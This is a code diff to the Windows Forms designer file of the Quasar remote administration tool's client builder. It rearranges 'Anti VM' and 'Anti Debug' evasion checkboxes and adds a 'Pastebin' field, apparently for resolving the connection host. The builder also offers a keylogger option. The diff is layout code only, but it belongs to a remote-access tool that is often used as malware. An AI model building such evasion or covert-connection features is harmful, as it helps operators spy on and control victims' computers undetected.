@@ -1,4 +1,4 @@
-﻿using Quasar.Server.Controls;
+using Quasar.Server.Controls;
 
 namespace Quasar.Server.Forms
 {
@@ -55,6 +55,11 @@ namespace Quasar.Server.Forms
             this.clearToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderTabs = new Quasar.Server.Controls.DotNetBarTabControl();
             this.generalPage = new System.Windows.Forms.TabPage();
+            this.chkAntiDebug = new System.Windows.Forms.CheckBox();
+            this.chkVM = new System.Windows.Forms.CheckBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.line2 = new Quasar.Server.Controls.Line();
+            this.label3 = new System.Windows.Forms.Label();
             this.label9 = new System.Windows.Forms.Label();
             this.line6 = new Quasar.Server.Controls.Line();
             this.label8 = new System.Windows.Forms.Label();
@@ -133,11 +138,10 @@ namespace Quasar.Server.Forms
             this.line10 = new Quasar.Server.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
-            this.label2 = new System.Windows.Forms.Label();
-            this.line2 = new Quasar.Server.Controls.Line();
-            this.label3 = new System.Windows.Forms.Label();
-            this.chkVM = new System.Windows.Forms.CheckBox();
-            this.chkAntiDebug = new System.Windows.Forms.CheckBox();
+            this.txtPastebin = new System.Windows.Forms.TextBox();
+            this.label13 = new System.Windows.Forms.Label();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.line11 = new Quasar.Server.Controls.Line();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
             this.contextMenuStrip.SuspendLayout();
@@ -251,6 +255,7 @@ namespace Quasar.Server.Forms
             this.builderTabs.Size = new System.Drawing.Size(535, 384);
             this.builderTabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
             this.builderTabs.TabIndex = 0;
+            this.builderTabs.SelectedIndexChanged += new System.EventHandler(this.builderTabs_SelectedIndexChanged);
             // 
             // generalPage
             // 
@@ -278,6 +283,58 @@ namespace Quasar.Server.Forms
             this.generalPage.TabIndex = 4;
             this.generalPage.Text = "Basic Settings";
             // 
+            // chkAntiDebug
+            // 
+            this.chkAntiDebug.AutoSize = true;
+            this.chkAntiDebug.Location = new System.Drawing.Point(93, 222);
+            this.chkAntiDebug.Name = "chkAntiDebug";
+            this.chkAntiDebug.Size = new System.Drawing.Size(85, 17);
+            this.chkAntiDebug.TabIndex = 25;
+            this.chkAntiDebug.Text = "Anti Debug";
+            this.chkAntiDebug.UseVisualStyleBackColor = true;
+            this.chkAntiDebug.CheckedChanged += new System.EventHandler(this.chkAntiDebug_CheckedChanged);
+            // 
+            // chkVM
+            // 
+            this.chkVM.AutoSize = true;
+            this.chkVM.Location = new System.Drawing.Point(20, 222);
+            this.chkVM.Name = "chkVM";
+            this.chkVM.Size = new System.Drawing.Size(67, 17);
+            this.chkVM.TabIndex = 24;
+            this.chkVM.Text = "Anti VM";
+            this.chkVM.UseVisualStyleBackColor = true;
+            this.chkVM.CheckedChanged += new System.EventHandler(this.chkVM_CheckedChanged);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.Color.Transparent;
+            this.label2.Location = new System.Drawing.Point(17, 203);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(299, 26);
+            this.label2.TabIndex = 22;
+            this.label2.Text = "Checks you want to run when something runs the client.\r\n\r\n";
+            // 
+            // line2
+            // 
+            this.line2.BackColor = System.Drawing.SystemColors.Control;
+            this.line2.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
+            this.line2.Location = new System.Drawing.Point(85, 187);
+            this.line2.Name = "line2";
+            this.line2.Size = new System.Drawing.Size(300, 13);
+            this.line2.TabIndex = 23;
+            this.line2.TabStop = false;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.Color.Transparent;
+            this.label3.Location = new System.Drawing.Point(6, 187);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(77, 13);
+            this.label3.TabIndex = 21;
+            this.label3.Text = "Anti Methods";
+            // 
             // label9
             // 
             this.label9.AutoSize = true;
@@ -291,6 +348,7 @@ namespace Quasar.Server.Forms
             // 
             // line6
             // 
+            this.line6.BackColor = System.Drawing.SystemColors.Control;
             this.line6.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line6.Location = new System.Drawing.Point(85, 78);
             this.line6.Name = "line6";
@@ -356,6 +414,7 @@ namespace Quasar.Server.Forms
             // 
             // line5
             // 
+            this.line5.BackColor = System.Drawing.SystemColors.Control;
             this.line5.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line5.Location = new System.Drawing.Point(112, 5);
             this.line5.Name = "line5";
@@ -385,6 +444,10 @@ namespace Quasar.Server.Forms
             // connectionPage
             // 
             this.connectionPage.BackColor = System.Drawing.SystemColors.Control;
+            this.connectionPage.Controls.Add(this.line11);
+            this.connectionPage.Controls.Add(this.checkBox1);
+            this.connectionPage.Controls.Add(this.label13);
+            this.connectionPage.Controls.Add(this.txtPastebin);
             this.connectionPage.Controls.Add(this.numericUpDownPort);
             this.connectionPage.Controls.Add(this.numericUpDownDelay);
             this.connectionPage.Controls.Add(this.line3);
@@ -404,6 +467,7 @@ namespace Quasar.Server.Forms
             this.connectionPage.Size = new System.Drawing.Size(391, 376);
             this.connectionPage.TabIndex = 0;
             this.connectionPage.Text = "Connection Settings";
+            this.connectionPage.Click += new System.EventHandler(this.connectionPage_Click);
             // 
             // numericUpDownPort
             // 
@@ -429,7 +493,7 @@ namespace Quasar.Server.Forms
             // 
             // numericUpDownDelay
             // 
-            this.numericUpDownDelay.Location = new System.Drawing.Point(276, 178);
+            this.numericUpDownDelay.Location = new System.Drawing.Point(274, 223);
             this.numericUpDownDelay.Maximum = new decimal(new int[] {
             600000,
             0,
@@ -447,8 +511,9 @@ namespace Quasar.Server.Forms
             // 
             // line3
             // 
+            this.line3.BackColor = System.Drawing.SystemColors.Control;
             this.line3.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line3.Location = new System.Drawing.Point(95, 159);
+            this.line3.Location = new System.Drawing.Point(104, 199);
             this.line3.Name = "line3";
             this.line3.Size = new System.Drawing.Size(290, 13);
             this.line3.TabIndex = 18;
@@ -457,7 +522,7 @@ namespace Quasar.Server.Forms
             // label4
             // 
             this.label4.AutoSize = true;
-            this.label4.Location = new System.Drawing.Point(6, 159);
+            this.label4.Location = new System.Drawing.Point(6, 199);
             this.label4.Name = "label4";
             this.label4.Size = new System.Drawing.Size(92, 13);
             this.label4.TabIndex = 17;
@@ -465,6 +530,7 @@ namespace Quasar.Server.Forms
             // 
             // line1
             // 
+            this.line1.BackColor = System.Drawing.SystemColors.Control;
             this.line1.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line1.Location = new System.Drawing.Point(104, 5);
             this.line1.Name = "line1";
@@ -494,7 +560,7 @@ namespace Quasar.Server.Forms
             // 
             // btnAddHost
             // 
-            this.btnAddHost.Location = new System.Drawing.Point(254, 78);
+            this.btnAddHost.Location = new System.Drawing.Point(254, 79);
             this.btnAddHost.Name = "btnAddHost";
             this.btnAddHost.Size = new System.Drawing.Size(129, 22);
             this.btnAddHost.TabIndex = 4;
@@ -505,7 +571,7 @@ namespace Quasar.Server.Forms
             // lblMS
             // 
             this.lblMS.AutoSize = true;
-            this.lblMS.Location = new System.Drawing.Point(356, 183);
+            this.lblMS.Location = new System.Drawing.Point(360, 225);
             this.lblMS.Name = "lblMS";
             this.lblMS.Size = new System.Drawing.Size(21, 13);
             this.lblMS.TabIndex = 11;
@@ -526,11 +592,12 @@ namespace Quasar.Server.Forms
             this.txtHost.Name = "txtHost";
             this.txtHost.Size = new System.Drawing.Size(129, 22);
             this.txtHost.TabIndex = 1;
+            this.txtHost.TextChanged += new System.EventHandler(this.txtHost_TextChanged_1);
             // 
             // lblDelay
             // 
             this.lblDelay.AutoSize = true;
-            this.lblDelay.Location = new System.Drawing.Point(17, 182);
+            this.lblDelay.Location = new System.Drawing.Point(6, 225);
             this.lblDelay.Name = "lblDelay";
             this.lblDelay.Size = new System.Drawing.Size(200, 13);
             this.lblDelay.TabIndex = 9;
@@ -590,6 +657,7 @@ namespace Quasar.Server.Forms
             // 
             // line7
             // 
+            this.line7.BackColor = System.Drawing.SystemColors.Control;
             this.line7.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line7.Location = new System.Drawing.Point(60, 274);
             this.line7.Name = "line7";
@@ -608,6 +676,7 @@ namespace Quasar.Server.Forms
             // 
             // line4
             // 
+            this.line4.BackColor = System.Drawing.SystemColors.Control;
             this.line4.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line4.Location = new System.Drawing.Point(117, 5);
             this.line4.Name = "line4";
@@ -821,6 +890,7 @@ namespace Quasar.Server.Forms
             // 
             // line8
             // 
+            this.line8.BackColor = System.Drawing.SystemColors.Control;
             this.line8.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line8.Location = new System.Drawing.Point(122, 5);
             this.line8.Name = "line8";
@@ -858,6 +928,7 @@ namespace Quasar.Server.Forms
             // 
             // line9
             // 
+            this.line9.BackColor = System.Drawing.SystemColors.Control;
             this.line9.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line9.Location = new System.Drawing.Point(83, 276);
             this.line9.Name = "line9";
@@ -1059,6 +1130,7 @@ namespace Quasar.Server.Forms
             // 
             // line10
             // 
+            this.line10.BackColor = System.Drawing.SystemColors.Control;
             this.line10.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
             this.line10.Location = new System.Drawing.Point(78, 5);
             this.line10.Name = "line10";
@@ -1086,56 +1158,41 @@ namespace Quasar.Server.Forms
             this.chkKeylogger.UseVisualStyleBackColor = true;
             this.chkKeylogger.CheckedChanged += new System.EventHandler(this.chkKeylogger_CheckedChanged);
             // 
-            // label2
+            // txtPastebin
             // 
-            this.label2.AutoSize = true;
-            this.label2.BackColor = System.Drawing.Color.Transparent;
-            this.label2.Location = new System.Drawing.Point(17, 203);
-            this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(299, 26);
-            this.label2.TabIndex = 22;
-            this.label2.Text = "Checks you want to run when something runs the client.\r\n\r\n";
+            this.txtPastebin.Location = new System.Drawing.Point(254, 126);
+            this.txtPastebin.Name = "txtPastebin";
+            this.txtPastebin.Size = new System.Drawing.Size(110, 22);
+            this.txtPastebin.TabIndex = 19;
+            this.txtPastebin.TextChanged += new System.EventHandler(this.txtPastebin_TextChanged);
             // 
-            // line2
+            // label13
             // 
-            this.line2.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line2.Location = new System.Drawing.Point(85, 187);
-            this.line2.Name = "line2";
-            this.line2.Size = new System.Drawing.Size(300, 13);
-            this.line2.TabIndex = 23;
-            this.line2.TabStop = false;
+            this.label13.AutoSize = true;
+            this.label13.Location = new System.Drawing.Point(175, 129);
+            this.label13.Name = "label13";
+            this.label13.Size = new System.Drawing.Size(60, 13);
+            this.label13.TabIndex = 20;
+            this.label13.Text = "Pastebin : ";
             // 
-            // label3
+            // checkBox1
             // 
-            this.label3.AutoSize = true;
-            this.label3.BackColor = System.Drawing.Color.Transparent;
-            this.label3.Location = new System.Drawing.Point(6, 187);
-            this.label3.Name = "label3";
-            this.label3.Size = new System.Drawing.Size(77, 13);
-            this.label3.TabIndex = 21;
-            this.label3.Text = "Anti Methods";
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(370, 129);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(15, 14);
+            this.checkBox1.TabIndex = 21;
+            this.checkBox1.UseVisualStyleBackColor = true;
             // 
-            // chkVM
+            // line11
             // 
-            this.chkVM.AutoSize = true;
-            this.chkVM.Location = new System.Drawing.Point(20, 222);
-            this.chkVM.Name = "chkVM";
-            this.chkVM.Size = new System.Drawing.Size(67, 17);
-            this.chkVM.TabIndex = 24;
-            this.chkVM.Text = "Anti VM";
-            this.chkVM.UseVisualStyleBackColor = true;
-            this.chkVM.CheckedChanged += new System.EventHandler(this.chkVM_CheckedChanged);
-            // 
-            // chkAntiDebug
-            // 
-            this.chkAntiDebug.AutoSize = true;
-            this.chkAntiDebug.Location = new System.Drawing.Point(93, 222);
-            this.chkAntiDebug.Name = "chkAntiDebug";
-            this.chkAntiDebug.Size = new System.Drawing.Size(85, 17);
-            this.chkAntiDebug.TabIndex = 25;
-            this.chkAntiDebug.Text = "Anti Debug";
-            this.chkAntiDebug.UseVisualStyleBackColor = true;
-            this.chkAntiDebug.CheckedChanged += new System.EventHandler(this.chkAntiDebug_CheckedChanged);
+            this.line11.BackColor = System.Drawing.SystemColors.Control;
+            this.line11.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
+            this.line11.Location = new System.Drawing.Point(175, 107);
+            this.line11.Name = "line11";
+            this.line11.Size = new System.Drawing.Size(216, 19);
+            this.line11.TabIndex = 22;
+            this.line11.TabStop = false;
             // 
             // FrmBuilder
             // 
@@ -1271,5 +1328,9 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.Label label3;
         private System.Windows.Forms.CheckBox chkAntiDebug;
         private System.Windows.Forms.CheckBox chkVM;
+        private Line line11;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.Label label13;
+        private System.Windows.Forms.TextBox txtPastebin;
     }
 }
